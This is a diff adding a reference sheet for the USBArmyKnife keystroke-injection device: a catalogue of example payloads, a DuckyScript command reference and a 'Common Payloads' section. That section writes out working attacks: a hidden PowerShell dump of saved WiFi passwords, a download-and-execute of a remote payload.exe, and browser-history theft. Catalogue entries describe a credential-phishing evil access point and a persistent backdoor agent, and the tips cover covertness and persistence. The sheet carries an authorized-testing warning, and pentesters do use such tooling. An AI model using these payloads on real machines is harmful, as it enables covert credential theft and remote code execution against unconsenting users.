@@ -1,0 +1,327 @@
+===============================================================================
+                        USBArmyKnife
+===============================================================================
+
+DEVICE INFO:
+  WiFi SSID: iPhone14
+  WiFi Pass: password
+  Web Interface: http://4.3.2.1:8080
+  
+IMPORTANT:
+  - To run a script, rename it to "autorun.ds"
+  - Scripts use Windows CRLF line endings
+  - Reboot device after changing autorun.ds (unplug/replug)
+
+===============================================================================
+                            AVAILABLE EXAMPLES
+===============================================================================
+
+1. DEFAULT.DS - Web Interface Mode
+   Description: Keeps device running with web interface accessible
+   Usage: Rename to autorun.ds, displays WiFi info on screen
+   Features: Web access, button test, LED feedback
+
+2. COVERTSTORAGE.DS - Hidden Storage
+   Description: First plug shows real SD card, subsequent plugs show fake drive
+   Usage: Perfect for hiding sensitive files in plain sight
+   Requirements: Extract covertstorage_disk.zip first
+   
+3. EVILAP.DS - Evil Access Point
+   Description: Creates fake "AppleFreeWiFi" hotspot to capture credentials
+   Usage: Victims connect and enter passwords which are logged
+   Files: evilap_apple.html (phishing page)
+
+4. RICKROLL.DS - Rick Roll Attack
+   Description: Opens YouTube rickroll, broadcasts lyrics via WiFi, displays on screen
+   Usage: Ultimate prank payload
+   Files: rickroll_1.png, rickroll_2.png, rickroll_3.png
+
+5. SELF_DESTRUCT.DS - Motion Detection Wipe
+   Description: Device wipes itself if motion detected (requires LD2410 sensor)
+   Usage: Anti-forensics demo
+   Files: self_destruct_bomb.png
+   Note: Requires hardware sensor - see original README
+
+6. SIMPLE_UI.DS - Menu Selection
+   Description: Button-based file selector UI
+   Usage: Browse and run multiple payloads from one interface
+   Files: simple_ui_select.png
+
+7. PROGRESSBAR.DS - Hollywood Style Progress Bar
+   Description: Shows fake "hacking" progress bar animation
+   Usage: Great for multi-stage attacks or demos
+   Files: progressbar_1.png through progressbar_4.png
+
+8. INSTALL_AGENT_AND_RUN_COMMAND (UK/US versions)
+   Description: Installs backdoor agent for remote command execution
+   Usage: Enables persistent access and VNC screen capture
+   Note: Requires building agent.img - see tools/Agent/
+
+9. LED_SWEEP_LED.DS - LED Test
+   Description: Cycles through RGB LED colors
+   Usage: Test device functionality
+
+10. LED_STOP_PAYLOAD_AND_CLEAR.DS - Stop Script
+    Description: Stops running payload and clears display
+    Usage: Emergency stop
+
+11. LINUX_PANIC.DS - Linux Kernel Panic
+    Description: Triggers kernel panic on Linux systems
+    Files: linux_panic_badfs.img
+
+12. MALICIOUS_ETHERNET_ADAPTER.DS - Fake Network Adapter
+    Description: Appears as Ethernet adapter, can intercept traffic
+    Files: malicious_ethernet_adapter_cdrom.iso
+
+13. MOUNT_WHOLE_DISK_AND_RUN_COMMAND.DS
+    Description: Mounts entire disk and executes commands
+    Usage: Full disk access attack
+
+14. MULTIPLE_KEYBOARD_LAYOUTS.DS
+    Description: Demonstrates switching between keyboard layouts
+    Usage: Cross-platform compatibility test
+
+15. USB_ETHERNET_PCAP.DS - Network Packet Capture
+    Description: Captures network traffic to SD card
+    Usage: Network analysis and pentesting
+
+16. WATCH.DS - Smartwatch Interface
+    Description: Full interactive menu system with IR, lock picking features
+    Files: watch_menu.png, watch_watchface.png
+
+17. WIFI_CONNECT_TO_EXISTING_AP.DS
+    Description: Connects to existing WiFi network
+    Usage: Network reconnaissance
+
+18. WIFI_DEAUTH_AND_CRYPT_CAPTURE.DS
+    Description: WiFi deauth attack + handshake capture for password cracking
+    Usage: WiFi security testing (use responsibly!)
+
+19. HOTMIC - Audio Recording (No files - check examples folder)
+
+20. VNC - Remote Desktop Access (No files - check examples folder)
+
+===============================================================================
+                        DUCKYSCRIPT COMMAND REFERENCE
+===============================================================================
+
+--- DELAYS ---
+DELAY <milliseconds>         Wait specified time
+DELAY 1000                   Wait 1 second
+DELAY 2000                   Wait 2 seconds
+
+--- KEYBOARD KEYS ---
+STRING <text>                Type text
+STRINGLN <text>              Type text + Enter
+ENTER                        Press Enter
+GUI r                        Windows+R (Run dialog)
+GUI                          Windows key
+ALT                          Alt key
+CONTROL / CTRL               Control key
+SHIFT                        Shift key
+TAB                          Tab key
+ESCAPE                       Escape key
+SPACE                        Space bar
+CAPSLOCK                     Caps Lock
+DELETE                       Delete key
+END                          End key
+HOME                         Home key
+INSERT                       Insert key
+PAGEUP / PAGEDOWN            Page Up/Down
+PRINTSCREEN                  Print Screen
+UPARROW / DOWNARROW          Arrow keys
+LEFTARROW / RIGHTARROW       Arrow keys
+
+--- KEYBOARD COMBOS ---
+CONTROL SHIFT ENTER          Ctrl+Shift+Enter (Admin)
+ALT F4                       Alt+F4 (Close window)
+CONTROL ALT DELETE           Ctrl+Alt+Del
+ALT TAB                      Alt+Tab (Switch windows)
+
+--- KEYBOARD LAYOUT ---
+KEYBOARD_LAYOUT win_en-GB    Set UK keyboard
+KEYBOARD_LAYOUT win_en-US    Set US keyboard (default)
+RAW_HID <keycode>            Send raw HID keycode
+
+--- LED CONTROL ---
+LED_R                        LED red
+LED_G                        LED green
+LED_B                        LED blue
+LED_OFF                      LED off
+
+--- DISPLAY CONTROL ---
+DISPLAY_TEXT <x> <y> <text>  Show text at coordinates
+DISPLAY_PNG <filepath>       Show PNG image
+DISPLAY_CLEAR                Clear display
+
+--- WIFI & NETWORK ---
+WIFI_OFF                     Disable WiFi
+ESP32M attack -t <type>      ESP32 Marauder attack
+  -t deauth                  WiFi deauth attack
+  -t rickroll                Broadcast rickroll lyrics
+  -t probe                   Probe request flood
+
+--- CONTROL FLOW ---
+VAR $NAME = <value>          Declare variable
+IF (<condition>)             If statement
+ELSE IF (<condition>)        Else if
+ELSE                         Else
+END_IF                       End if block
+
+WHILE (TRUE)                 Infinite loop
+WHILE (<condition>)          Conditional loop
+END_WHILE                    End loop
+
+FUNCTION <NAME>()            Declare function
+END_FUNCTION                 End function
+<NAME>()                     Call function
+
+--- BUTTON INPUT ---
+WAIT_FOR_BUTTON_PRESS        Wait for button press
+BUTTON_SHORT_PRESS()         Check if short press
+BUTTON_LONG_PRESS()          Check if long press
+WAIT_FOR_BUTTON_PRESS_OR_TIMEOUT <ms>  Wait with timeout
+
+--- FILE SYSTEM ---
+LOAD_DS_FILES_FROM_SD()      Load .ds files from SD
+FILE_INDEX_VALID()           Check if file index valid
+RUN_PAYLOAD <filename>       Run another .ds file
+RESTART_PAYLOAD              Restart current script
+
+--- AGENT COMMANDS (requires agent.img) ---
+AGENT_INSTALL <path>         Install agent from disk image
+AGENT_RUN <command>          Run command via agent
+WAIT_FOR_AGENT_RUN_RESULT    Wait for agent response
+AGENT_CONNECTED()            Check if agent connected
+
+--- LOGGING ---
+LOG <message>                Write to log (viewable on web interface)
+
+--- SPECIAL COMMANDS ---
+SELF_DESTRUCT()              Wipe device (custom implementation)
+
+--- OPERATORS ---
+==                           Equal to
+!=                           Not equal to
+>                            Greater than
+<                            Less than
++                            Addition
+-                            Subtraction
+*                            Multiplication
+/                            Division
+
+===============================================================================
+                            COMMON PAYLOADS
+===============================================================================
+
+--- Windows Run Command ---
+DELAY 2000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING <your command>
+ENTER
+
+--- Windows PowerShell ---
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1500
+STRING <your powershell command>
+ENTER
+
+--- Admin PowerShell ---
+CONTROL ESCAPE
+DELAY 500
+STRING cmd
+DELAY 500
+CONTROL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING <your admin command>
+ENTER
+
+--- Grab WiFi Passwords ---
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1500
+STRING (netsh wlan show profiles) | Select-String ":(.+)$" | %{$_.Matches.Groups[1].Value.Trim()} | %{$password=$null; (netsh wlan show profile name=$_ key=clear) | Select-String "Key Content:(.+)$" | %{$password=$_.Matches.Groups[1].Value.Trim()}; [PSCustomObject]@{ SSID=$_; Password=$password }} | Out-File $env:TEMP\wifi.txt
+ENTER
+
+--- Download and Execute ---
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1500
+STRING Invoke-WebRequest -Uri 'http://example.com/payload.exe' -OutFile $env:TEMP\p.exe; Start-Process $env:TEMP\p.exe
+ENTER
+
+--- Browser History Steal ---
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1500
+STRING Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" -Destination "$env:TEMP\chrome_history.db"
+ENTER
+
+===============================================================================
+                            TIPS & TRICKS
+===============================================================================
+
+1. TEST SCRIPTS: Always test on your own machine first!
+
+2. TIMING: Add extra DELAY if commands run too fast for target machine
+
+3. KEYBOARD LAYOUTS: Use KEYBOARD_LAYOUT or RAW_HID for non-US keyboards
+
+4. WEB INTERFACE: Use WHILE(TRUE) + WAIT_FOR_BUTTON_PRESS to keep web server running
+
+5. MULTIPLE PAYLOADS: Use SIMPLE_UI.DS as base for menu system
+
+6. PERSISTENCE: Use INSTALL_AGENT examples for long-term access
+
+7. COVERTNESS: Turn off WiFi/LED/Display with:
+   WIFI_OFF
+   LED_OFF
+   DISPLAY_CLEAR
+
+8. DEBUGGING: Check logs at http://4.3.2.1:8080 when connected to device WiFi
+
+9. SD CARD: FAT32 format, max 32GB recommended
+
+10. LINE ENDINGS: Must be Windows CRLF, use unix2dos if needed
+
+===============================================================================
+                          SECURITY & LEGAL WARNING
+===============================================================================
+
+These tools are for EDUCATIONAL and AUTHORIZED TESTING ONLY!
+
+Unauthorized access to computer systems is ILLEGAL. Only use on:
+  - Your own devices
+  - Systems you own
+  - Systems you have WRITTEN PERMISSION to test
+
+Misuse can result in criminal charges. Use responsibly!
+
+===============================================================================
+                            SUPPORT & RESOURCES
+===============================================================================
+
+Repository: https://github.com/i-am-shodan/USBArmyKnife
+Wiki: https://github.com/i-am-shodan/USBArmyKnife/wiki
+Issues: https://github.com/i-am-shodan/USBArmyKnife/issues
+
+Device: Waveshare ESP32-S3 1.47inch
+Firmware: USBArmyKnife  (ESP32-S3 build)
+
+===============================================================================
